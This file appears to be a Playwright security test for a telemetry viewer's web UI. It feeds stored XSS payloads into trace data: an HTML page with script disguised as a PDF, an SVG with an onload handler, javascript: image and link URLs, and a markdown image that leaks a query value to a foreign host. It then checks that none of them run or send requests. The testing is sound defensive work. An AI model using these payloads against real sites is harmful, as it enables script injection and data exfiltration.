// Recorded data is written by whoever can send telemetry, so the pages that
// show it must not run it or fetch from hosts it names
// (internal/weft/webui CSP, components/media, components/SafeMarkdown.tsx):
// - a {_type: "Pdf", mimetype: "text/html"} value runs no script: no dialog,
//   no same-origin blob: document, only a download;
// - a markdown image or image_url part on another host is not requested
//   until the viewer clicks "Image from <host>", and then without a Referer;
// - javascript: image URLs never reach an href or src;
// - no Content-Security-Policy violation on any of these pages.
import { createServer, type IncomingHttpHeaders, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { expect, test, type Page } from '@playwright/test'
import { watchErrors } from './helpers'

const P = `e2e${Date.now().toString(36)}/untrusted`
const SID = 'untrusted-session'
const TRACE = '5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e5e'
const ROOT = '5a5a5a5a5a5a5a5a'
const CHAT = '5b5b5b5b5b5b5b5b'
const MEDIA = '5c5c5c5c5c5c5c5c'

// The page the "PDF" really is: it reports itself every way it can.
const EVIL_HTML =
  '<html><body><script>window.__xss=1;try{top.__xss=1}catch(e){};try{opener.__xss=1}catch(e){};document.title="XSSBLOB";alert("xss-"+document.domain)</script>evil</body></html>'
const EVIL_B64 = Buffer.from(EVIL_HTML).toString('base64')
const EVIL_SVG_B64 = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="top.__xss=1;alert(1)"><script>top.__xss=1</script></svg>').toString('base64')

let foreign: Server
let foreignBase = ''
const hits: { url: string; headers: IncomingHttpHeaders }[] = []

const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64')

test.beforeAll(async ({ request }) => {
  // A host the recorded data points at: any request to it is a leak.
  foreign = createServer((req, res) => {
    hits.push({ url: req.url ?? '', headers: req.headers })
    res.writeHead(200, { 'Content-Type': 'image/gif' })
    res.end(GIF)
  })
  await new Promise<void>((done) => foreign.listen(0, '127.0.0.1', done))
  foreignBase = `http://127.0.0.1:${(foreign.address() as AddressInfo).port}`

  const now = Date.now() - 60_000
  const ns = (ms: number) => String((now + ms) * 1e6)
  const kv = (key: string, v: unknown) => ({ key, value: { stringValue: typeof v === 'string' ? v : JSON.stringify(v) } })
  const md = `Here is the chart ![chart](${foreignBase}/md-image?leak=SECRET) and a [link](javascript:alert('link'))`
  const span = (spanId: string, parent: string | null, name: string, at: number, attrs: Record<string, unknown>) => ({
    traceId: TRACE,
    spanId,
    ...(parent ? { parentSpanId: parent } : {}),
    name,
    kind: 1,
    startTimeUnixNano: ns(at),
    endTimeUnixNano: ns(at + 500),
    attributes: Object.entries(attrs).map(([k, v]) => kv(k, v)),
  })
  const spans = [
    span(ROOT, null, 'invoke_agent untrusted', 0, {
      'gen_ai.operation.name': 'invoke_agent',
      'gen_ai.agent.name': 'untrusted',
      'gen_ai.conversation.id': SID,
      'gen_ai.input.messages': JSON.stringify([{ role: 'user', parts: [{ type: 'text', content: md }] }]),
      'gen_ai.output.messages': JSON.stringify([{ role: 'assistant', parts: [{ type: 'text', content: `Done ![out](${foreignBase}/root-out.png)` }] }]),
    }),
    span(CHAT, ROOT, 'chat untrusted', 100, {
      'gen_ai.operation.name': 'chat',
      'weft.inputs': {
        messages: [
          {
            role: 'user',
            content: [
              { type: 'text', text: md },
              { type: 'image_url', image_url: { url: "javascript:alert('image_url')" } },
              { type: 'image_url', image_url: { url: `${foreignBase}/image-url.png` } },
              { type: 'image', source: { type: 'base64', media_type: 'text/html', data: EVIL_B64 } },
            ],
          },
        ],
      },
      'weft.output': { type: 'message', role: 'assistant', content: [{ type: 'image', source: { type: 'url', url: "javascript:alert('source')" } }] },
    }),
    span(MEDIA, ROOT, 'media untrusted', 200, {
      'weft.inputs': {
        pdf: { _type: 'Pdf', mimetype: 'text/html', data: EVIL_B64, filename: 'evil.pdf' },
        svg: { _type: 'Content', mimetype: 'image/svg+xml', data: EVIL_SVG_B64, filename: 'evil.svg' },
        image: { _type: 'Image', url: `${foreignBase}/typed-image.png`, mimetype: 'image/png' },
      },
      'weft.output': { _type: 'Pdf', mimetype: 'text/html', data: EVIL_B64, filename: 'out.pdf' },
    }),
  ]
  const r = await request.post('/otel/v1/traces', {
    headers: { project_id: P },
    data: { resourceSpans: [{ resource: { attributes: [kv('service.name', 'e2e')] }, scopeSpans: [{ scope: { name: 'e2e' }, spans }] }] },
  })
  expect(r.ok()).toBe(true)
})

test.afterAll(async () => {
  await new Promise<void>((done) => foreign.close(() => done()))
})

/** Opens `path` and checks nothing in it ran, leaked or broke the policy. */
async function openAndCheck(page: Page, path: string) {
  const errors = watchErrors(page)
  const dialogs: string[] = []
  const requests: string[] = []
  page.on('dialog', (d) => {
    dialogs.push(d.message())
    void d.dismiss()
  })
  page.context().on('page', (p) => p.on('dialog', (d) => (dialogs.push(d.message()), void d.dismiss())))
  page.on('request', (r) => {
    if (r.url().startsWith(foreignBase)) requests.push(r.url())
  })
  const before = hits.length
  await page.goto(path)
  await page.waitForLoadState('networkidle')
  await expect(page.locator('h1').first()).toBeVisible()
  await expect(page.locator('.spinner')).toHaveCount(0)
  await page.waitForTimeout(1000)

  expect(dialogs, `${path}: dialogs`).toEqual([])
  expect(requests, `${path}: requests to the foreign host`).toEqual([])
  expect(hits.length - before, `${path}: requests the foreign host saw`).toBe(0)
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss), `${path}: script ran in the page`).toBeUndefined()
  expect(await page.title()).not.toBe('XSSBLOB')
  // No frame holds a same-origin document made from recorded data.
  for (const f of page.frames()) {
    const url = f.url()
    expect(url.startsWith('blob:'), `${path}: blob frame ${url}`).toBe(false)
    const ran = await f.evaluate(() => (window as unknown as { __xss?: number }).__xss).catch(() => undefined)
    expect(ran, `${path}: script ran in frame ${url}`).toBeUndefined()
  }
  // Unsafe URLs never reach an href or src; nothing embeds a document.
  expect(await page.locator('[href^="javascript:" i], [src^="javascript:" i], [href^="data:text" i], [src^="data:text" i]').count()).toBe(0)
  expect(await page.locator('object, embed').count(), `${path}: embedded objects`).toBe(0)
  expect(errors, `${path}: console errors (CSP violations included)`).toEqual([])
}

test('a stored text/html "PDF" runs no script and downloads as a file', async ({ page, context }) => {
  await openAndCheck(page, `/${P}/spans/${MEDIA}`)
  await expect(page.getByText('evil.pdf').first()).toBeVisible()
  // The SVG shows only through <img>, where it runs nothing.
  await expect(page.locator('img[src^="data:image/svg+xml"]')).toHaveCount(1)
  await expect(page.getByRole('link', { name: 'Open PDF' })).toHaveCount(0)
  const pages = context.pages().length
  const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Download' }).first().click()])
  expect(download.suggestedFilename()).toBe('evil.pdf')
  await page.waitForTimeout(500)
  expect(context.pages().length, 'no tab opened').toBe(pages)
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined()
  // The typed image on another host waits for a click too.
  await expect(page.getByRole('button', { name: /^Image from 127\.0\.0\.1:\d+$/ })).toHaveCount(1)
})

test('chat images and markdown images on another host load only on request, without a Referer', async ({ page }) => {
  await openAndCheck(page, `/${P}/spans/${CHAT}`)
  const buttons = page.getByRole('button', { name: /^Image from 127\.0\.0\.1:\d+$/ })
  await expect(buttons).toHaveCount(2)
  // javascript: and data:text/html image URLs show as text.
  await expect(page.locator('.media-unsafe-url')).toHaveCount(3)
  await expect(page.locator('.media-unsafe-link', { hasText: 'link' }).first()).toBeVisible()

  const before = hits.length
  await buttons.first().click()
  await expect(page.locator(`img[src^="${foreignBase}/md-image"]`)).toBeVisible()
  await expect.poll(() => hits.length).toBe(before + 1)
  const hit = hits[hits.length - 1]
  expect(hit.url).toBe('/md-image?leak=SECRET')
  expect(hit.headers.referer, 'no Referer to the foreign host').toBeUndefined()
})

test('session pages do not contact hosts named in the session', async ({ page }) => {
  await openAndCheck(page, `/${P}/sessions/${SID}`)
  await openAndCheck(page, `/${P}/traces/sessions/${SID}`)
  await openAndCheck(page, `/${P}/spans/${ROOT}`)
})

test('the UI is served with its Content-Security-Policy and no Referer', async ({ request }) => {
  const r = await request.get(`/${P}/spans/${MEDIA}`)
  const csp = r.headers()['content-security-policy'] ?? ''
  expect(csp).toContain("script-src 'self';")
  expect(csp).toContain("object-src blob:;")
  expect(csp).toContain("frame-ancestors 'none'")
  expect(r.headers()['referrer-policy']).toBe('no-referrer')
})
